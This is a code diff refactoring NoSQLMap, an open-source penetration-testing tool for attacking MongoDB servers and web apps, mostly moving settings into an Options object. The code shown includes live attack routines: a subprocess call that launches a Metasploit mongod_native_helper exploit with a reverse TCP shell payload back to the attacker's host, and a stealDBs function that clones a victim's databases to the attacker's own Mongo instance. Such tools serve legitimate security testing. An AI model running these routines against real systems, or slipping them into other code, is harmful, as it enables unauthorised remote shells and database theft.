@@ -1,4 +1,6 @@
 #!/usr/bin/python
+# -*- coding: UTF-8 -*-
+
 #NoSQLMap Copyright 2013 Russell Butturini
 #This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -22,9 +24,19 @@ import httplib2
 import urllib
 import pymongo
 import subprocess
-from options import Options
+from lib.options import Options
+
+TEST=False
 
 options=Options()
+
+if TEST:
+	import testing
+	testing.testUnit()
+
+
+
+
 
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
 global optionSet
@@ -52,11 +64,11 @@ def mainMenu():
 		select = raw_input("Select an option:")
 
 		if select == "1":
-			Options.setOptions()
+			options.setInteractiveOptions()
 
 		elif select == "2":
-			if optionSet[0] == True:
-				netAttacks(victim)
+			if options.minRequirementsForNetAttack():
+				netAttacks()
 
 			#Check minimum required options
 			else:
@@ -66,7 +78,7 @@ def mainMenu():
 
 		elif select == "3":
 			#Check minimum required options
-			if (optionSet[0] == True) and (optionSet[2] == True):
+			if options.minRequirementsForWebApps():
 				webApps()
 
 			else:
@@ -82,11 +94,14 @@ def mainMenu():
 
 
 
-def netAttacks(target):
+def netAttacks():
+	'''min necessary: a target'''
 	mgtOpen = False
 	webOpen = False
 	#This is a global for future use with other modules; may change
 	global dbList
+
+	target = options.victim
 
 	#Check for default config
 	try:
@@ -127,14 +142,15 @@ def netAttacks(target):
 		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
 
 		if stealDB == "y" or stealDB == "Y":
-			stealDBs (myIP)
+			stealDBs ()
 
-		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")
+		getShell = raw_input("Try to get a shell? (Requires mongoDB <2.2.4)?")
 
 		if getShell == "y" or getShell == "Y":
 			#Launch Metasploit exploit
 			try:
-				proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
+				#TODO: check myIP and myPort are set before calling it
+				proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(target) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
 
 			except:
 				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
@@ -152,6 +168,10 @@ def webApps():
 	appUp = False
 	strTbAttack = False
 	intTbAttack = False
+
+	victim = options.victim
+	webPort = options.port
+	uri = options.uri
 
 	#Verify app is working.
 	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
@@ -554,8 +574,11 @@ def buildUri(origUri, randValue):
 
 	return evilUri
 
-def stealDBs(myDB):
+def stealDBs():
 	menuItem = 1
+
+	myDB = options.myIP
+	victim = options.victim
 
 	for dbName in dbList:
 		print str(menuItem) + "-" + dbName
@@ -566,7 +589,7 @@ def stealDBs(myDB):
 
 	except:
 		print "Invalid selection."
-		stealDBs(myDB)
+		stealDBs()
 
 	try:
 		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
@@ -575,7 +598,7 @@ def stealDBs(myDB):
 		cloneAnother = raw_input("Database cloned.  Copy another?")
 
 		if cloneAnother == "y" or cloneAnother == "Y":
-			stealDBs(myDB)
+			stealDBs()
 
 		else:
 			return()
